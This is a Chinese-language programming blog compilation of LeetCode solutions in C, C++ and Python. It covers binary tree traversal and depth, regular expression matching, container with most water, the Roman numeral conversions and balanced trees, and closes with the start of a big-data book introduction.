> read more on how binary tree is serialized on OJ.



我的解决方案，非常传统的两个队列的解决方案：
/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}
 * };
 */
class Solution {
public:
    vector<vector<int>> levelOrder(TreeNode* root) 
    {
        
      
	vector<vector<int>> result;
	queue<TreeNode*> q;

	if (root == NULL)
	{
		return result;
	}
	q.push(root);
	vector<int> le_temp;

	while(!q.empty())
	{

		le_temp.clear();
		queue<TreeNode*> level;
            
        int size = q.size();    
		for(int i = 0; i < size; ++i)
		{
			TreeNode* temp = q.front();
			q.pop();
			if(temp->left)
			{
				level.push(temp->left);
			}
			if(temp->right)
			{
				level.push(temp->right);
				
			}
			le_temp.push_back(temp->val);
		}

		while(!level.empty())
		{

			q.push(level.front());   
			level.pop();
		}
		result.push_back(le_temp);
	}

	return result;
        
    }
};

一个栈似乎也行：
 vector<vector<int>> levelOrder(TreeNode* root) 
    {
        
     vector<vector<int> >  result;
        if (!root) return result;
        queue<TreeNode*> q;
        q.push(root);
        q.push(NULL);
        vector<int> cur_vec;
        while(!q.empty()) {
            TreeNode* t = q.front();
            q.pop();
            if (t==NULL) {
                result.push_back(cur_vec);
                cur_vec.resize(0);
                if (q.size() > 0) {
                    q.push(NULL);
                }
            } else {
                cur_vec.push_back(t->val);
                if (t->left) q.push(t->left);
                if (t->right) q.push(t->right);
            }
        }
        return result;

        
    }


递归的解决方案：
class Solution {
public:
    vector<vector<int>> result;
    void buildVector(TreeNode* root, int depth)
    {
        if(root == NULL)return ;
        if(result.size() == depth)
        {
            result.push_back(vector<int>());
        }
        
        result[depth].push_back(root->val);
        
        buildVector(root->left,depth + 1);
        buildVector(root->right, depth + 1);
    }
    vector<vector<int>> levelOrder(TreeNode* root) 
    {
        buildVector(root,0);
        return result;
    }
};
逆序排列把return 改一下就好了：  return 
vector<vector<int> > (result.rbegin(), result.rend());
}

﻿﻿
﻿﻿









Maximum Depth of Binary Tree 
 Total Accepted: 63668 Total Submissions: 141121 My Submissions  
Question  Solution  
Given a binary tree, find its maximum depth.
The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.
我的解决方案： 

/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}
 * };
 */
class Solution {
public:
    int maxDepth(TreeNode* root)
    {


        if(NULL == root)
            return 0;

        int depth_l = maxDepth(root->left);
        int depth_r = maxDepth(root->right);

        return depth_l > depth_r  ? depth_l + 1:depth_r + 1;


    }
};
一行代码的解法：
int maxDepth(TreeNode *root)
{
    return root == NULL ? 0 : max(maxDepth(root -> left), maxDepth(root -> right)) + 1;
}

不用递归的解法：Breadth-first-search
int maxDepth(TreeNode *root)
{
    if(root == NULL)
        return 0;

    int res = 0;
    queue<TreeNode *> q;
    q.push(root);
    while(!q.empty())
    {
        ++ res;
        for(int i = 0, n = q.size(); i < n; ++ i)
        {
            TreeNode *p = q.front();
            q.pop();

            if(p -> left != NULL)
                q.push(p -> left);
            if(p -> right != NULL)
                q.push(p -> right);
        }
    }

    return res;
}

不用递归的解法2
int maxDepth(TreeNode *root)
{
    if (root == NULL) return 0;
    stack<TreeNode *> gray;
    stack<int> depth;
    int out = 0;

    gray.push(root);
    depth.push(1);
    while (!gray.empty()) {
        TreeNode *tmp = gray.top();
        int num = depth.top();
        gray.pop();
        depth.pop();
        if (tmp->left == NULL && tmp->right == NULL) {
            out = num > out ? num : out;
        }
        else {
            if (tmp->left != NULL) {
                gray.push(tmp->left);
                depth.push(num + 1);
            }
            if (tmp->right != NULL) {
                gray.push(tmp->right);
                depth.push(num + 1);
            }
        }
    }
    return out;
}

python 的解决方案：
# Definition for a  binary tree node
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None

class Solution:
    # @param root, a tree node
    # @return an integer
    def maxDepth(self, root):

        def maxDepthHelper(root):
            if not root: return 0
            return max(1+maxDepthHelper(root.left), 1+maxDepthHelper(root.right))

        return maxDepthHelper(root)
 









最近代码写的少了，而leetcode一直想做一个python，c/c++解题报告的专题，c/c++一直是我非常喜欢的，c语言编程练习的重要性体现在linux内核编程以及一些大公司算法上机的要求，python主要为了后序转型数据分析和机器学习，所以今天来做一个难度为hard 的简单正则表达式匹配。
做了很多leetcode题目，我们来总结一下套路： 
首先一般是检查输入参数是否正确，然后是处理算法的特殊情况，之后就是实现逻辑，最后就是返回值。
当编程成为一种解决问题的习惯，我们就成为了一名纯粹的程序员

leetcode 10 Regular Expression Matching
（简单正则表达式匹配）
题目描述

Implement regular expression matching with support for ‘.’ and ‘*’. 
  ‘.’ Matches any single character. 
  ‘*’ Matches zero or more of the preceding element. 
  The matching should cover the entire input string (not partial). 
  The function prototype should be: 
  bool isMatch(const char *s, const char *p)
Some examples: 
  isMatch(“aa”,”a”) → false 
  isMatch(“aa”,”aa”) → true 
  isMatch(“aaa”,”aa”) → false 
  isMatch(“aa”, “a*”) → true 
  isMatch(“aa”, “.*”) → true 
  isMatch(“ab”, “.*”) → true 
  isMatch(“aab”, “c*a*b”) → true


题目意义及背景
It might seem deceptively easy even you know the general idea, but programming it correctly with all the details require careful thought.
在程序设计中，规划所有的细节问题都需要认真思考。

题目分析以及需要注意的问题
为什么aab可以匹配模式c*a*b呢？
● It is a regular expression.Not a wild card.So the ” * ” does not mean any string.And the cab should be split like this “c * a * b” which means N “c”,N “a” and One “b”.
’ * ’ Matches zero or more of the preceding element, so ” c* ” could match nothing.
此题不能使用贪心法
考虑情况：
s = “ac”, p = “ab*c”
After the first ‘a’, we see that there is no b’s to skip for “b*”. We match the last ‘c’ on both side and conclude that they both match.
It seems that being greedy is good. But how about this case?
s = “abbc”, p = “ab*bbc” 
When we see “b*” in p, we would have skip all b’s in s. They both should match, but we have no more b’s to match. Therefore, the greedy approach fails in the above case.
可能还有人说，如果碰到这种情况可以先看一下*后面的内容，但是碰见下面的情况就不好办了。
s = “abcbcd”, p = “a.*c.*d” 
Here, “.*” in p means repeat ‘.’ 0 or more times. Since ‘.’ can match any character, it is not clear how many times ‘.’ should be repeated. Should the ‘c’ in p matches the first or second ‘c’ in s? 
所以： 
Unfortunately, there is no way to tell without using some kind of exhaustive search（穷举搜索）.
Hints:
A sample diagram of a deterministic finite state automata (DFA). DFAs are useful for doing lexical analysis and pattern matching. An example is UNIX’s grep tool. Please note that this post does not attempt to descibe a solution using DFA.
什么是DFA？
Solution
主要解决方案是回溯法，使用递归或者dp
We need some kind of backtracking mechanism （回溯法）such that when a matching fails, we return to the last successful matching state and attempt to match more characters in s with ‘*’. This approach leads naturally to recursion.
The recursion mainly breaks down elegantly to the following two cases: 主要考虑两种递归情况 
  1. If the next character of p is NOT ‘*’, then it must match the current character of s. Continue pattern matching with the next character of both s and p. 
  2. If the next character of p is ‘*’, then we do a brute force exhaustive matching of 0, 1, or more repeats of current character of p… Until we could not match any more characters. 
You would need to consider the base case carefully too. That would be left as an exercise to the reader.
Below is the extremely concise code (Excluding comments and asserts, it’s about 10 lines of code).
解题过程如下：

1、考虑特殊情况即*s字符串或者*p字符串结束。 
  （1）s字符串结束，要求*p也结束或者间隔‘’ （例如p=”a*b*c……”），否则无法匹配 
  （2）*s字符串未结束，而*p字符串结束，则无法匹配 
  2、*s字符串与*p字符串均未结束 
  （1）(p+1)字符不为’‘，则只需比较s字符与*p字符，若相等则递归到(s+1)字符串与*(p+1)字符串的比较，否则无法匹配。 
  （2）(p+1)字符为’‘，则p字符可以匹配*s字符串中从0开始任意多（记为i）等于*p的字符，然后递归到(s+i+1)字符串与*(p+2)字符串的比较， 
  只要匹配一种情况就算完全匹配。

bool isMatch(const char *s,const char *p)
{
    //判断参数合法，以及程序正常结束
    assert( s && p);
    if(*p == '\0') return *s == '\0';

    //next char is not '*'; must match current character
    if(*(p+1) != '*')
    {
        assert(*p != '*');//考虑情况isMatch('aa','a*');
        return ((*p == *s) ||(*p == '.' && *s != '\0')) && isMatch(s + 1, p + 1);
    }

    //next char is '*' 继续递归匹配,不能写成*(p+1) == '*' 考虑情况isMatch('ab','.*c')
    while((*p == *s)|| (*p == '.' && *s != '\0'))
    {
        if (isMatch(s, p+2)) return true;
        s++;
    }

    //匹配下一个模式
    return isMatch(s,p+2);
}

此代码运行时间：18ms 


Further Thoughts:

Some extra exercises to this problem: 
    1. If you think carefully, you can exploit some cases that the above code runs in exponential complexity. Could you think of some examples? How would you make the above code more efficient? 
    2. Try to implement partial matching instead of full matching. In addition, add ‘^’ and ‘$’ to the rule. ‘^’ matches the starting position within the string, while ‘$’ matches the ending position of the string. 
    3. Try to implement wildcard matching where ‘*’ means any sequence of zero or more characters. 
  For the interested reader, real world regular expression matching (such as the grep tool) are usually implemented by applying formal language theory. To understand more about it, you may read this article. 
  Rating: 4.8/5 (107 votes cast) 
  Regular Expression Matching, 4.8 out of 5 based on 107 ratings

leetcode的 解题报告提醒我们说：
leetcode的解答报告中说的If you are stuck, recursion is your friend.
// 递归版，时间复杂度O(n)，空间复杂度O(1)
class Solution {
 public:
  bool isMatch(const char *s, const char *p)
  {
      if (*p == '\0') return *s == '\0';
      // next char is not '*', then must match current character
      if (*(p + 1) != '*')

      {
          if (*p == *s || (*p == '.' && *s != '\0'))
              return isMatch(s + 1, p + 1);
          else
              return false;

      }
      else
      { // next char is '*'
          while (*p == *s || (*p == '.' && *s != '\0'))
          {
              if (isMatch(s, p + 2))
                  return true;
              s++;
          }
          return isMatch(s, p + 2);
      }
  }
};

c++解决方案：
My concise recursive and DP solutions with full explanation in C++ 
  ●  
Please refer to my blog post if you have any comment. Wildcard matching problem can be solved similarly.
class Solution {
public:
    bool isMatch(string s, string p) {
        if (p.empty())    return s.empty();

        if ('*' == p[1])
            // x* matches empty string or at least one character: x* -> xx*
            // *s is to ensure s is non-empty
            return (isMatch(s, p.substr(2)) || !s.empty() && (s[0] == p[0] || '.' == p[0]) && isMatch(s.substr(1), p));
        else
            return !s.empty() && (s[0] == p[0] || '.' == p[0]) && isMatch(s.substr(1), p.substr(1));
    }
};

class Solution {
public:
    bool isMatch(string s, string p) {
        /**
         * f[i][j]: if s[0..i-1] matches p[0..j-1]
         * if p[j - 1] != '*'
         *      f[i][j] = f[i - 1][j - 1] && s[i - 1] == p[j - 1]
         * if p[j - 1] == '*', denote p[j - 2] with x
         *      f[i][j] is true iff any of the following is true
         *      1) "x*" repeats 0 time and matches empty: f[i][j - 2]
         *      2) "x*" repeats >= 1 times and matches "x*x": s[i - 1] == x && f[i - 1][j]
         * '.' matches any single character
         */
        int m = s.size(), n = p.size();
        vector<vector<bool>> f(m + 1, vector<bool>(n + 1, false));

        f[0][0] = true;
        for (int i = 1; i <= m; i++)
            f[i][0] = false;
        // p[0.., j - 3, j - 2, j - 1] matches empty iff p[j - 1] is '*' and p[0..j - 3] matches empty
        for (int j = 1; j <= n; j++)
            f[0][j] = j > 1 && '*' == p[j - 1] && f[0][j - 2];

        for (int i = 1; i <= m; i++)
            for (int j = 1; j <= n; j++)
                if (p[j - 1] != '*')
                    f[i][j] = f[i - 1][j - 1] && (s[i - 1] == p[j - 1] || '.' == p[j - 1]);
                else
                    // p[0] cannot be '*' so no need to check "j > 1" here
                    f[i][j] = f[i][j - 2] || (s[i - 1] == p[j - 2] || '.' == p[j - 2]) && f[i - 1][j];

        return f[m][n];
    }
};

The shortest AC code.
1.’.’ is easy to handle. if p has a ‘.’, it can pass any single character in s except ‘\0’. 
2.” is a totally different problem. if p has a ” character, it can pass any length of first-match characters in s including ‘\0’.
  class Solution {
    public:
    bool matchFirst(const char *s, const char *p){
        return (*p == *s || (*p == '.' && *s != '\0'));
    }

bool isMatch(const char *s, const char *p) {
    if (*p == '\0') return *s == '\0';  //empty

    if (*(p + 1) != '*') {//without *
        if(!matchFirst(s,p)) return false;
        return isMatch(s + 1, p + 1);
    } else { //next: with a *
        if(isMatch(s, p + 2)) return true;    //try the length of 0
        while ( matchFirst(s,p) )       //try all possible lengths 
            if (isMatch(++s, p + 2))return true;
    }
}
};


a shorter one (14 lines of code) with neatly format:
class Solution {
public:
    bool isMatch(const char *s, const char *p) {
        for( char c = *p; c != 0; ++s, c = *p ) {
            if( *(p+1) != '*' )
                p++;
            else if( isMatch( s, p+2 ) )
                return true;
            if( (*s==0) || ((c!='.') && (c!=*s)) )
                return false;
        }
        return *s == 0;
    }
};

9-lines 16ms C++ DP Solutions with Explanations 
  ● 

This problem has a typical solution using Dynamic Programming. We define the state P[i][j] to be true if s[0..i) matches p[0..j) and false otherwise. Then the state equations are: 
        a. P[i][j] = P[i - 1][j - 1], if p[j - 1] != ‘*’ && (s[i - 1] == p[j - 1] || p[j - 1] == ‘.’); 
        b. P[i][j] = P[i][j - 2], if p[j - 1] == ‘*’ and the pattern repeats for 0 times; 
        c. P[i][j] = P[i - 1][j] && (s[i - 1] == p[j - 2] || p[j - 2] == ‘.’), if p[j - 1] == ‘*’ and the pattern repeats for at least 1 times. 
  Putting these together, we will have the following code.

class Solution {
public:
    bool isMatch(string s, string p) {
        int m = s.length(), n = p.length(); 
        vector<vector<bool> > dp(m + 1, vector<bool> (n + 1, false));
        dp[0][0] = true;
        for (int i = 0; i <= m; i++)
            for (int j = 1; j <= n; j++)
                if (p[j - 1] == '*')
                    dp[i][j] = dp[i][j - 2] || (i > 0 && (s[i - 1] == p[j - 2] || p[j - 2] == '.') && dp[i - 1][j]);
                else dp[i][j] = i > 0 && dp[i - 1][j - 1] && (s[i - 1] == p[j - 1] || p[j - 1] == '.');
        return dp[m][n];
    }
};
2 years agoreply quote 
python解决方案
使用re库，叼炸天！
import re

class Solution:
    # @return a boolean
    def isMatch(self, s, p):
        return re.match('^' + p + '$', s) != None

# debug
s = Solution()
print (s.isMatch("aaa", ".*")）
Python DP solution in 36 ms
def isMatch(self, s, p):
    m = len(s)
    n = len(p)
    dp = [[True] + [False] * m]
    for i in xrange(n):
        dp.append([False]*(m+1))

    for i in xrange(1, n + 1):
        x = p[i-1]
        if x == '*' and i > 1:
            dp[i][0] = dp[i-2][0]
        for j in xrange(1, m+1):
            if x == '*':
                dp[i][j] = dp[i-2][j] or dp[i-1][j] or (dp[i-1][j-1] and p[i-2] == s[j-1]) or (dp[i][j-1] and p[i-2]=='.')
            elif x == '.' or x == s[j-1]:
                dp[i][j] = dp[i-1][j-1]

    return dp[n][m]
about a year agoreply quote 

class Solution(object):
    def isMatch(self, s, p, memo={("",""):True}):
        if not p and s:      return False
        if not s and p:      return set(p[1::2]) == {"*"} and not (len(p) % 2)
        if (s,p) in memo:    return memo[s,p]

        char, exp, prev = s[-1], p[-1], 0 if len(p) < 2 else p[-2]
        memo[s,p] =\
               (exp == '*' and ((prev in {char, '.'} and self.isMatch(s[:-1], p, memo)) or self.isMatch(s, p[:-2], memo)))\
               or\
               (exp in {char, '.'} and self.isMatch(s[:-1], p[:-1], memo))
        return memo[s,p]

# 445 / 445 test cases passed.
# Status: Accepted
# Runtime: 72 ms
8ms backtracking solution C++
//regular expression matching
//first solution: using recursive version
class Solution {
public:
    bool isMatch(string s, string p) {
        int m = s.length(), n = p.length();
        return backtracking(s, m, p, n);
    }

    bool backtracking(string& s, int i, string& p, int j) {
        if (i == 0 && j == 0) return true;
        if (i != 0 && j == 0) return false;
        if (i == 0 && j != 0) {
            //in this case only p == "c*c*c*" this pattern can match null string
            if (p[j-1] == '*') {
                return backtracking(s, i, p, j-2);
            }
            return false;
        }
        //now both i and j are not null
        if (s[i-1] == p[j-1] || p[j-1] == '.') {
            return backtracking(s, i - 1, p, j - 1);
        } else if (p[j-1] == '*') {
            //two cases: determines on whether p[j-2] == s[i-1]
            //first p[j-2]* matches zero characters of p
            if (backtracking(s, i, p, j - 2)) return true;
            //second consider whether p[j-2] == s[i-1], if true, then s[i-1] is matched, move to backtracking(i - 1, j)
            if (p[j-2] == s[i-1] || p[j-2] == '.') {
                return backtracking(s, i - 1, p, j);
            }
            return false;
        }
        return false;
    }
};

c语言参考解决方案： 
3ms C solution using O(mn) time and O(n) space
bool isMatch(char *s, char *p){
    int i;

    int ls = strlen(s);
    int lp = strlen(p);
    bool* m = malloc((ls + 1) * sizeof(bool));

    // init
    m[0] = true;
    for (i = 1; i <= ls; i++) {
        m[i] = false;
    }

    int ip;
    for (ip = 0; ip < lp; ip++) {
        if (ip + 1 < lp && p[ip + 1] == '*') {
            // do nothing
        }
        else if (p[ip] == '*') {
            char c = p[ip - 1];
            for (i = 1; i <= ls; i++) {
                m[i] = m[i] || (m[i - 1] && (s[i - 1] == c || c == '.'));
            }
        }
        else {
            char c = p[ip];
            for (i = ls; i > 0; i--) {
                m[i] = m[i - 1] && (s[i - 1] == c || c == '.');
            }
            m[0] = false;
        }
    }

    bool ret = m[ls];
    free(m);
    return ret;
}

简短的代码：
bool isMatch(char* s, char* p) {
    while (*s) {
        if (*p&&*(p+1)=='*') {
            if (!(*p==*s||*p=='.')) {p+=2;continue;} 
            if (!isMatch(s,p+2)) {s++;continue;} else return true;
        }
        if (*p==*s||*p=='.') {s++;p++;continue;}
        return false;
    }
    while(*p&&*(p+1)=='*') p+=2;
    return !*p;

}

参考文献
http://articles.leetcode.com/regular-expression-matching 
http://blog.csdn.net/gatieme/article/details/51049244 
http://www.jianshu.com/p/85f3e5a9fcda id="tmp_downloadhelper_iframe" style="display: none;"> 






Balanced Binary Tree Total Accepted: 63288 Total Submissions: 198315  My Submissions
                     
 
Given a binary tree, determine if it is height-balanced.
For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.
 
 
 
 
我的解决方案：一个非递归一个递归，居然比全递归的版本慢。
 
 

/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}
 * };
 */
class Solution {
public:
int Depth(TreeNode* root)
    {
       if(root == NULL)return 0;
        
        int result = 0;
        queue<TreeNode *>q;
        q.push(root);
        
        while(!q.empty())
        {
            ++result;
            
            for(int i = 0,n = q.size(); i < n ; i++)
            {
                TreeNode* p = q.front();
                q.pop();
                
                if(p->left!= NULL)q.push(p->left);
                if(p->right!= NULL)q.push(p->right);
            }
            
           
        }
         return result;
    }
    
    bool isBalanced(TreeNode* root)
    {
        if(root == NULL)
        return true;
        
        int left = Depth(root->left);
        int right = Depth(root -> right);
        return abs(left - right)<=1&& isBalanced(root -> left)&&isBalanced(root ->right);
    }
};
 
 
 
 
 
 
 

This problem is generally believed to have two solutions: the top down approach and the bottom up way.

1.The first method checks whether the tree is balanced strictly according to the definition of balanced binary tree: the difference between the heights of the two sub trees are not bigger than 1, and both the left sub tree and right sub tree are also balanced. With the helper function depth(), we could easily write the code; 

class solution {
public:
    int depth (TreeNode *root) {
        if (root == NULL) return 0;
        return max (depth(root -> left), depth (root -> right)) + 1;
    }

    bool isBalanced (TreeNode *root) {
        if (root == NULL) return true;

        int left=depth(root->left);
        int right=depth(root->right);

        return abs(left - right) <= 1 && isBalanced(root->left) && isBalanced(root->right);
    }
};

For the current node root, calling depth() for its left and right children actually has to access all of its children, thus the complexity is O(N). We do this for each node in the tree, so the overall complexity of isBalanced will be O(N^2). This is a top down approach.

2.The second method is based on DFS. Instead of calling depth() explicitly for each child node, we return the height of the current node in DFS recursion. When the sub tree of the current node (inclusive) is balanced, the function dfsHeight() returns a non-negative value as the height. Otherwise -1 is returned. According to the leftHeight and rightHeight of the two children, the parent node could check if the sub tree is balanced, and decides its return value.

class solution {
public:
int dfsHeight (TreeNode *root) {
        if (root == NULL) return 0;

        int leftHeight = dfsHeight (root -> left);
        if (leftHeight == -1) return -1;
        int rightHeight = dfsHeight (root -> right);
        if (rightHeight == -1) return -1;

        if (abs(leftHeight - rightHeight) > 1)  return -1;
        return max (leftHeight, rightHeight) + 1;
    }
    bool isBalanced(TreeNode *root) {
        return dfsHeight (root) != -1;
    }
};

In this bottom up approach, each node in the tree only need to be accessed once. Thus the time complexity is O(N), better than the first solution.

 
 
 
 
 
 

class Solution {
public:
    bool isBalanced(TreeNode *root) {
        // recursion
        if (!root) return true;
        int l = maxDepth(root->left);
        int n = maxDepth(root->right);
        if (abs(l - n) <= 1)
            return isBalanced(root->left) && isBalanced(root->right);
        else
            return false;
    }

    int maxDepth(TreeNode* root)
    {
        if (!root)
            return 0;
        return 1 + max(maxDepth(root->left), maxDepth(root->right));
    }
};

 
 
 

/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     struct TreeNode *left;
 *     struct TreeNode *right;
 * };
 */

int checkBalanceAndDepth(struct TreeNode* node, bool *isBalanced)
{
    int leftDepth = node->left == NULL? 0 : checkBalanceAndDepth(node->left, isBalanced);
    if(!*isBalanced)
    {
        return -1;
    }
    int rightDepth = node->right == NULL? 0 :checkBalanceAndDepth(node->right, isBalanced);
    if(!*isBalanced)
    {
        return -1;
    }
    int diff = leftDepth - rightDepth;
    *isBalanced = (diff == -1 || diff == 0 || diff == 1);
    return leftDepth > rightDepth? leftDepth + 1 : rightDepth + 1;
}
bool isBalanced(struct TreeNode* root) {
    if(root == NULL) return true;
    bool balanced = true;
    checkBalanceAndDepth(root, &balanced);
    return balanced;
}

 
 
 
 
 
 

def depth(self,root):
        if root == None:
            return 0
        else:
            return max(self.depth(root.left), self.depth(root.right))+1



    def isBalanced(self, root):
        if root == None:
            return True
        n1=self.depth(root.left)
        n2=self.depth(root.right)
        if ((n1-n2) in range(-1,2)) and self.isBalanced(root.left) and self.isBalanced(root.right):
            return True
        else:
            return False

 
 
 
 
 
﻿﻿ 








1.题目描述
Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai).

 n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0).

Find two lines, which together with x-axis forms a container, such that the container contains the most water.

Note: You may not slant the container and n is at least 2.


2.中文解释：
给定n个非负整数a1,a2,…,an，其中每个代表一个点坐标（i,ai）。
n个垂直线段例如线段的两个端点在（i,ai）和（i,0）。
找到两个线段，与x轴形成一个容器，使其包含最多的水。
备注：你不必倾倒容器。

3.超时的c++算法
当然，谁都可以想到的解法就是暴力匹配，当遇到等差数列的时候当然就超时了！！！

// leetcode11.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<vector>
using namespace std;


int maxArea(vector<int>& height)
{
    int max = 0;
    if (height.size() == 0) return 0;

    int length = height.size();
    int area = 0;
    for(int i=0;i<length;i++)
    {
        for (int j = i; j < length; j++)
        {
            int high = height[j] > height[i]?height[i]:height[j];
            area = high*(j - i);
            if (max<area)
            {
                max = area;

            }
        }

    }


    return max;
}
int main()
{
    vector<int> array(10);
    array.push_back(1);
    array.push_back(1);

    int area = maxArea(array);
    return 0;
}

4.正确答案

算法证明：
Here is the proof. 
Proved by contradiction:
Suppose the returned result is not the optimal solution. Then there must exist an optimal solution, say a container with a_ol and a_or (left and right respectively), such that it has a greater volume than the one we got. Since our algorithm stops only if the two pointers meet. So, we must have visited one of them but not the other. WLOG, let’s say we visited a_ol but not a_or. When a pointer stops at a_ol, it won’t move until
The other pointer also points to a_ol. 
In this case, iteration ends. But the other pointer must have visited a_or on its way from right end to a_ol. Contradiction to our assumption that we didn’t visit a_or.
The other pointer arrives at a value, say a_rr, that is greater than a_ol before it reaches a_or. 
In this case, we does move a_ol. But notice that the volume of a_ol and a_rr is already greater than a_ol and a_or (as it is wider and heigher), which means that a_ol and a_or is not the optimal solution – Contradiction!
Both cases arrive at a contradiction.
参考答案：
///C++

int maxArea(vector<int>& height) {
    int water = 0;
    int i = 0, j = height.size() - 1;
    while (i < j) {
        int h = min(height[i], height[j]);
        water = max(water, (j - i) * h);
        while (height[i] <= h && i < j) i++;
        while (height[j] <= h && i < j) j--;
    }
    return water;
}
///C语言参考答案

A bit shorter and perhaps faster because I can use raw int pointers, but a bit longer because I don't have min and max.

int maxArea(int* heights, int n) {
    int water = 0, *i = heights, *j = i + n - 1;
    while (i < j) {
        int h = *i < *j ? *i : *j;
        int w = (j - i) * h;
        if (w > water) water = w;
        while (*i <= h && i < j) i++;
        while (*j <= h && i < j) j--;
    }
    return water;
}
python参考答案
class Solution:
    def maxArea(self, height):
        i, j = 0, len(height) - 1
        water = 0
        while i < j:
            water = max(water, (j - i) * min(height[i], height[j]))
            if height[i] < height[j]:
                i += 1
            else:
                j -= 1
        return water
我的完整工程：
// leetcode11.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<vector>
using namespace std;

///超时了
int maxArea(vector<int>& height)
{
    int max = 0;
    if (height.size() == 0) return 0;

    int length = height.size();
    int area = 0;
    for(int i=0;i<length;i++)
    {
        for (int j = i; j < length; j++)
        {
            int high = height[j] > height[i]?height[i]:height[j];
            area = high*(j - i);
            if (max<area)
            {
                max = area;

            }
        }

    }


    return max;
}

///accept
int maxArea2(vector<int>& height)
{
    int max = 0;
    if (height.size() == 0) return 0;

    int length = height.size();
    int area = 0;
    int l = 0;
    int r = length - 1;

    while (l < r)
    {
        int high = height[l] > height[r] ? height[r] : height[l];
        max = max > (high * (r - l)) ?  max : (high * (r - l));
        if (height[l] < height[r])
            l++;
        else
            r--;
    }

    return max;
}
int main()
{
    vector<int> array(0);
    array.push_back(1);
    array.push_back(1);

    int area = maxArea2(array);
    return 0;
}

 









12 Integer to Roman 
13 Roman to Integer      
有可能不注意的结果： 

class Solution {
public:

/*

1、相同的数字连写，所表示的数等于这些数字相加得到的数，如：Ⅲ = 3；
2、小的数字在大的数字的右边，所表示的数等于这些数字相加得到的数， 如：Ⅷ = 8；Ⅻ = 12；
3、小的数字，（限于Ⅰ、X 和C）在大的数字的左边，所表示的数等于大数减小数得到的数，如：Ⅳ= 4；Ⅸ= 9；
4、正常使用时，连写的数字重复不得超过三次。（表盘上的四点钟“IIII”例外）
5、在一个数的上面画一条横线，表示这个数扩大1000倍。




*/
    int romanToInt(string s) 
    {
        int res=0;
        int lastValue=0;
        int digit;
        for(int i=s.size()-1;i>=0;i--){
            switch(s[i]){
                case 'I': digit=1; break;
                case 'V': digit=5; break;
                case 'X': digit=10; break;
                case 'L': digit=50; break;
                case 'C': digit=100; break;
                case 'D': digit=500; break;
                case 'M': digit=1000; break;
            }
            if(digit>=lastValue){
                res+=digit;
                lastValue=digit;
            }
            else res-=digit;
        }
        return res;
    }


};
罗马数字是阿拉伯数字传入之前使用的一种数码。罗马数字采用七个罗马字母作数字、即Ⅰ（1）、X（10）、C（100）、M（1000）、V（5）、L（50）、D（500）。记数的方法： 
  1. 相同的数字连写，所表示的数等于这些数字相加得到的数，如 Ⅲ=3； 
  2. 小的数字在大的数字的右边，所表示的数等于这些数字相加得到的数，如 Ⅷ=8、Ⅻ=12； 
  3. 小的数字（限于 Ⅰ、X 和 C）在大的数字的左边，所表示的数等于大数减小数得到的数，如 Ⅳ=4、Ⅸ=9； 
  4. 在一个数的上面画一条横线，表示这个数增值 1,000 倍，如 
  5.  

string intToRoman(int num)
 {
    string table[4][10] = {{"", "I", "II", "III", "IV", "V", "VI", "VII", "VIII", "IX"},
                           {"", "X", "XX", "XXX", "XL", "L", "LX", "LXX", "LXXX", "XC"},
                           {"", "C", "CC", "CCC", "CD", "D", "DC", "DCC", "DCCC", "CM"},
                           {"", "M", "MM", "MMM"}
                          };
    string result;
    int count = 0;
    while(num > 0){
        int temp = num % 10;
        result = table[count][temp] + result;
        num /= 10;
        count++;
    }
    return result;
}
The basic idea is really simple: replace every digit in num by roman numerals. 
For example, we have a num: 2438. 
2 –> “MM” 
4 –> “CD” 
3 –> “XXX” 
8 –> “VIII” 
Then the result is “MMCDXXXVIII”.
M = ["", "M", "MM", "MMM"];
C = ["", "C", "CC", "CCC", "CD", "D", "DC", "DCC", "DCCC", "CM"];
X = ["", "X", "XX", "XXX", "XL", "L", "LX", "LXX", "LXXX", "XC"];
I = ["", "I", "II", "III", "IV", "V", "VI", "VII", "VIII", "IX"];
return M[num/1000] + C[(num%1000)/100] + X[(num%100)/10] + I[num%10];
Simple C solution 16ms 
  ● 0 
L
ljbschen  
Reputation:  10
void helper (char* ans, int* curp, int step, int one, int five, int ten) {
    char ch[]={'I','V','X','L','C','D','M'};
    int offset=0;
    if (step==1000) offset=6;
    else if (step==100) offset=4;
    else if (step==10) offset=2;
    else offset=0;

    if (one==-1) ans[(*curp)++] = ch[offset];
    if (ten==1)  ans[(*curp)++] = ch[offset+2];
    if (five==1) ans[(*curp)++] = ch[offset+1];
    while (one-->0) ans[(*curp)++] = ch[offset];
}

char* intToRoman(int num) {
    char *ans = malloc(sizeof(char)*16);
    int i=0, step=1000, digit=0;
    int one=0,five=0,ten=0;
    int curp=0;
    while (num>0) {
        digit=num/step;
        if (digit==9) {one=-1;five=0;ten=1;}
        else if (digit>=5) {one=digit-5;five=1;ten=0;}
        else if (digit==4) {one=-1;five=1;ten=0;}
        else if (digit==0) {one=0;five=0;ten=0;}
        else {one=digit;five=0;ten=0;}
        helper(ans,&curp,step,one,five,ten);
        num-=digit*step;
        step/=10;
    }
    ans[curp]='\0';
    return ans;
}

《架构大数据—-大数据技术及算法解析》
绪论 
2013年被称为大数据元年，据IDC预测，到2020年全球将拥有35ZB（1ZB = 1021字节）的数据，大数据涉及国家战略、区域及企业发展、社会民生的方方面面，掌握大数据的核心概念、模式和技术，就把握了新时代的脉搏。 
1.大数据技术概述
1.1大数据的概念 
大数据指的是无法在规定时间内用现有的常规软件工具对其内容进行抓取、管理和处理的数据集合。 
大数据技术则特指新一代的创新型的技术，能够突破常规软件的限制，是对大数据进行采集、存储和处理的技术的统称。 
